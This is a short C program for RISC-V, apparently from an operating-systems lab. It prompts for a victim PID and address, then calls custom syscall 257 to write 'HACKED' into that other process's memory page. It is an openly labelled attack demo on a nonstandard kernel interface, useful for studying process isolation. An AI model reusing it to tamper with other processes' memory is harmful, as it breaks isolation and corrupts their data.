#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>


int main(){

	char a[0x2000];
	printf("addr %p\n", (void*)a);
	
	void* a_page = (unsigned long)a & 0xfffffffffffff000;
	a_page = (unsigned long)a_page + 0x1000;
	// for(int i = 0; i<0x2000;i++){
	// 	a[i] = 'A';
	// }
	

	printf("%p\n",(void*)a_page);
	printf("victim's pid : ");
	int pid;
	int my_pid = getpid();
	scanf("%d",&pid);
	
	unsigned long vaddr = 0;
	printf("victim's vaddr : ");
	scanf("%lx",&vaddr);
	printf("vaddr : 0x%lx\n",vaddr);
	unsigned int a_offset = (unsigned long)vaddr & 0xfff;
	memcpy((a_page+a_offset), "HACKED\n", 7);

	unsigned long vpage = (unsigned long)vaddr & 0xfffffffffffff000;
	unsigned long offset = (unsigned long)vaddr & 0xfff;
	printf("vpage : 0x%lx\n",vpage);
	printf("offset : 0x%lx\n",offset);

	register long int a7 asm ("a7") = 257;
	register long int a0 asm ("a0") = my_pid;
	register long int a1 asm ("a1") = pid;
	register long int a2 asm ("a2") = a_page;
	register long int a3 asm ("a3") = vpage;
	asm volatile ("scall\n\t"
		: "+r" (a0)
		: "r" (a7), "r" (a1), "r" (a2), "r" (a3)
		: "memory");


	return 0;
}